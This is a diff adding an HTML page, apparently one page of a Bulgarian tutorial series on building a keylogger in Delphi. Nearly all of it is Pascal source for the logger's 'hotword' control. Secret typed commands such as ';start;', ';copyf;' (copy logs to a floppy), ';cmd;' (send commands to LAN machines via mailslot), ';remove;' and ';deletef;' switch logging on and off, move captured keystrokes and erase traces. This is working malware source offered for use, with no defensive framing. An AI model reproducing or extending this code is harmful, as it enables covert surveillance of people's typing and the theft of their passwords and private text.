@@ -1,0 +1,239 @@
+<html>
+<head>
+<title>Keylogger - Hotwords</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</head>
+
+<body bgcolor="#666666" text="#CCCCCC" link="#FFFFFF" vlink="#0000CC" alink="#0000FF">
+<p><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"></font></font><font face="Courier New, Courier, mono">А 
+  сега да ви обясня как работи hotword: </font></p>
+<table width="100%" border="1">
+  <tr> 
+    <td bgcolor="#000099"> 
+      <p><font face="Courier New, Courier, mono">{nqkoi ot <font color="#CCCCCC">nujnite 
+        za primera globalni promenlivi</font>. funkciqta se izpulnqva sled SpyKey 
+        i vuv <b>St</b> vi e kop4eto, koeto shte se ni trqbva sega}<br>
+        <font color="#FFFFFF">function <font color="#FFFF00">GetKey: Boolean;</font><br>
+        var</font><font color="#FFFF00"><br>
+        </font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;St: 
+        <font color="#FFFFFF">string</font>;</font><font face="Courier New, Courier, mono"><font color="#FFFF00"><br>
+        </font></font><font color="#FFFF00"> </font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFF00">KeyRec: 
+        <font color="#FFFFFF">string</font>[10];</font></font></p>
+      <p><font face="Courier New, Courier, mono" color="#FFFFFF">function</font><font face="Courier New, Courier, mono" color="#FFFF00"> 
+        SetKeyRec: Boolean;<br>
+        <font color="#FFFFFF">var</font><br>
+        &nbsp;&nbsp;i: Integer;<br>
+        <font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        Length(St) &gt; 1 <font color="#FFFFFF">then</font> Result := false<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;<font color="#FFFFFF">else</font> 
+        Result := true;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        St =' BkSp ' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#CCCCCC">{ako 
+        e BkSp iztrii poslednata bukva ot KeyRec}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">begin</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;Delete(KeyRec,Length(KeyRec), 1);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;St := '';<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        St = ' Space ' <font color="#FFFFFF">then</font> St := ' '; <font color="#CCCCCC">{ako 
+        e Space pishi #32 vuv Keyrec}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        Length(KeyRec) = 10 <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#CCCCCC">{ako 
+        Keyrec e pulen premesti znacite za da moje da se dobavi <b>St</b>}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;<font color="#FFFFFF">for</font> 
+        i := 0 to 9 <font color="#FFFFFF">do</font> KeyRec[i] := KeyRec[i+1];<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;SetLength(KeyRec, 9);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">end</font>;<br>
+        &nbsp;&nbsp;KeyRec := KeyRec + St;<br>
+        <font color="#FFFFFF">end</font>;</font></p>
+      <font face="Courier New, Courier, mono" color="#FFFFFF">procedure</font><font face="Courier New, Courier, mono" color="#FFFF00"> 
+      CheckKeywords;<br>
+      </font> <font face="Courier New, Courier, mono" color="#FFFF00"> <font color="#CCCCCC">{haide 
+      sega da proverim dali imame hotword}</font><br>
+      <font color="#FFFFFF">var</font><br>
+      &nbsp;&nbsp;str5, str6, str7, str8, str9: <font color="#FFFFFF">string</font>;<br>
+      <br>
+      <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">procedure</font> 
+      SetStr;<br>
+      <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#CCCCCC">{zarejdat 
+      se dumi sus daden broi bukvi, zavisi kolko shte ni trqbvat sled tova}</font> 
+      <br>
+      <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">begin</font><br>
+      &nbsp;&nbsp;&nbsp;&nbsp;str5 := Copy(KeyRec, Length(KeyRec) - 4, 5);<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;str6 := Copy(KeyRec, Length(KeyRec) - 5, 6);<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;str7 := Copy(KeyRec, Length(KeyRec) - 6, 7);<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;str8 := Copy(KeyRec, Length(KeyRec) - 7, 8);<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;str9 := Copy(KeyRec, Length(KeyRec) - 8, 9);<br>
+      <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">end</font>;</font> 
+      <p><font face="Courier New, Courier, mono" color="#FFFFFF">begin</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{ako 
+        ne nqmame nov hotword si izlez}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        <font color="#FFFFFF">not</font> SetKeyRec <font color="#FFFFFF">then</font> 
+        exit;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{zaredi 
+        dumite za proverka}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>SetStr;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{ei 
+        tuka se proverqva dali dumata ne e ;end; . Tui kato stringa e 5 znaka 
+        go sravnqvame </font><font face="Courier New, Courier, mono" color="#FFFF00"></font><font color="#CCCCCC">sus 
+        str5. Ako suvpadat ... ne se seshtam :-) Pishem help i vijdame kakvo pravi 
+        taq </font><font face="Courier New, Courier, mono" color="#FFFF00"></font><font color="#CCCCCC">function}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str5 = ';end;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>Started 
+        := false;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>if 
+        DoBeep then MessageBeep(MB_OK); <font color="#CCCCCC">{ako e vlkiucheno 
+        DoBeep bibitka za da pokaje che e </font><font color="#CCCCCC">prieta 
+        komandata}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str7 = ';start;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>Started 
+        := true;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        DoBeep <font color="#FFFFFF">then</font> MessageBeep(MB_OK);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{A 
+        da setih se ! ;end; i ;start; sa, za da vkliuchvash i izkliuchvash hotword 
+        </font><font color="#CCCCCC">proverkite. Kato ikliuchush i samo ;start; 
+        bachka, da ne stane nqkakvo oburkvane de </font><font color="#CCCCCC">:</font><font face="Courier New, Courier, mono" color="#FFFF00"></font><font color="#CCCCCC">) 
+        }</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        <font color="#FFFFFF">not</font> Started <font color="#FFFFFF">then</font> 
+        exit;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{;exit; 
+        - izkliuchvai vsi4ko i izlizai. DExit e, za da izleze i ot CloseQuery-to}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str6 = ';exit;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>DExit 
+        := true;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>Main.Timer1.Enabled 
+        := false;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>Application.Terminate;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{ei 
+        tuka ima malko tehniki. tova e za vuvejdane na komanda kum komputer vuv 
+        LAN. ;cmd; </font><font face="Courier New, Courier, mono" color="#FFFF00"></font><font color="#CCCCCC">vkliuchva 
+        dobavqneto na stringove vuv Par1, koito shte sudurja imeto na komputera 
+        kum, </font><font face="Courier New, Courier, mono" color="#FFFF00"></font><font color="#CCCCCC">koito 
+        e komandata}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str5 = ';cmd;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;</font>GetPar1 
+        := true;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        DoBeep <font color="#FFFFFF">then</font> MessageBeep(MB_OK);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{pokazva 
+        help window}</font> <br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str6 = ';help;' <font color="#FFFFFF">then</font> ShowHelp;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#CCCCCC">{vkliuchva/izkliuchva 
+        bibitkane na komanda}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str6 = ';beep;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>DoBeep 
+        := <font color="#FFFFFF">not</font> DoBeep;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        DoBeep <font color="#FFFFFF">then</font> MessageBeep(MB_OK);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{pokazva 
+        About-a}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str7 = ';about;' <font color="#FFFFFF">then</font> ShowAbout;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{Copira 
+        log failovete vuv A:}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str7 = ';copyf;' <font color="#FFFFFF">then</font> CopyFToA;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{zapochvane 
+        na naglasqne na liniite za save-ane. ;line; ,sled tova tova nomer i nakraq 
+        </font><font face="Courier New, Courier, mono" color="#FFFF00"></font><font color="#CCCCCC">;}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str7 = ';lines;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;</font>GetLinesStr 
+        := true;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        DoBeep <font color="#FFFFFF">then</font> MessageBeep(MB_OK);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{vkliuchva/izkliuchva 
+        vzimaneto na teksta pri paste}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str7 = ';paste;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>CanPaste 
+        := <font color="#FFFFFF">not</font> CanPaste;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        DoBeep <font color="#FFFFFF">then</font> MessageBeep(MB_OK);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{drugite 
+        gi chetete v help-a :-P }</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str7 = ';readf;' <font color="#FFFFFF">then</font> ReadF;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str8 = ';remove;' <font color="#FFFFFF">then</font> Remove;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str8 = ';repeat;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">with</font> 
+        LastCmd <font color="#FFFFFF">do</font> Main.MailSlot1.SendMessage(PCName, 
+        Msg);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str8 = ';status;' <font color="#FFFFFF">then</font> ShowStatus;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str8 = ';writew;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>WriteWin 
+        := <font color="#FFFFFF">not</font> WriteWin;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        DoBeep <font color="#FFFFFF">then</font> MessageBeep(MB_OK);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str9 = ';cfghelp;' <font color="#FFFFFF">then</font> ShowCfgHelp;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str9 = ';deletef;' <font color="#FFFFFF">then</font> DeleteF;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str9 = ';editcfg;' <font color="#FFFFFF">then</font> CfgOpen;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str9 = ';remhelp;' <font color="#FFFFFF">then</font> ShowRemoteHelp;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        str9 = ';refresh;' <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>&nbsp;&nbsp;</font>CfgRead;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+        DoBeep <font color="#FFFFFF">then</font> MessageBeep(MB_OK);<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{zapisva 
+        cfg-to shtoto sigurno ste promenili nqkoi raboti}</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;</font>CfgWrite;<br>
+        <font color="#FFFFFF">end</font>;</font></p>
+    </td>
+  </tr>
+</table>
+<p>&nbsp;&nbsp;&nbsp;<font face="Courier New, Courier, mono">Можете да си вкарвате 
+  каквито искате думи за команди (ex. tovaeednakomanda,'drugakomada, i tova, *kakvotovipadne*). 
+  Естествено може да се наложи да промените дължината на KeyRec и някои от проверките 
+  свързани с нея.</font></p>
+<table width="100%" border="0">
+  <tr> 
+    <td><font face="Courier New, Courier, mono"><a href="log1.htm">назад</a></font></td>
+    <td> 
+      <div align="center"><font face="Courier New, Courier, mono"><a href="logger.htm#view">начало</a></font></div>
+    </td>
+    <td> 
+      <div align="right"><font face="Courier New, Courier, mono"><a href="log3.htm">напред</a></font></div>
+    </td>
+  </tr>
+</table>
+</body>
+</html>
